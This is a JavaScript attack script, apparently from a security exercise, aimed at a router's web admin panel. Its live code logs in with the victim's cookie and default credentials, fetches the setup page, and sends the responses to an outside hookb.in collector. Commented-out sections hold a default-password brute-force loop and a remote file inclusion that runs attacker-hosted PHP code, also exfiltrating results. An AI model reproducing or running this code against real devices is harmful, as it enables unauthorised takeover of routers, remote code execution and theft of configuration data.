const http = new XMLHttpRequest();
http.open('POST', 'http://router.local/login.php', true);
//'http://router.local/home.php?action=view&'+cook -> what we http.responseURL if successful login
//http://router.local/view.php
const cook = document.cookie;
//http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true); -> how to run own php code (e.g. ls)
//http.open('POST', 'http://router.local/setup.php', true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseURL));
};

http.onreadystatechange = function() {
          if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
            if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
              const req = new XMLHttpRequest();
                req.open('POST', 'http://router.local/setup.php', true);
                req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                req.onload = function () {
                  const r = new XMLHttpRequest();
                  r.open('POST', 'https://hookb.in/6JnzJz7yJetoRnwwYr2Y', true);
                  r.setRequestHeader('Content-type', 'application/json');
                  r.send(JSON.stringify(http.responseText));
                };
                req.send();
            }
          }
}

//http.send();
http.send(cook+"&username=admin&pin=password&notRobot=on");



// const unames = ["admin","root","cisco"];
// const pwords = ["123456","admin","password","secured"];
// var breakCheck = false;
// for (u in unames) {
//   for (p in pwords) {
//     let http = new XMLHttpRequest();
//     var url = cook+"&username="u+"&pin="+p+"&notRobot=on";
//     http.open('POST', 'http://router.local/login.php', true);
//        http.onreadystatechange = function() {
//           if(http.readyState === XMLHttpRequest.DONE && http.status === 200) {
//             if (http.responseURL === 'http://router.local/home.php?action=view&'+cook) {
//               breakCheck = true;
//               break;
//             }
//           }
//        }
//     http.send(url)
//   }
//    if (breakCheck) break;
// }
//should be logged in at this point...

//const xhr = new XMLHttpRequest();
//const cook = document.cookie;
//xhr.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
// xhr.onload = function () {
//                 const req = new XMLHttpRequest();
//                 req.open('POST', 'https://hookb.in/W1yMQRGygKSYplzz6Rzp', true);
//                 req.setRequestHeader('Content-type', 'application/json');
//                 req.send(JSON.stringify(xhr.response));

// };
// xhr.send();



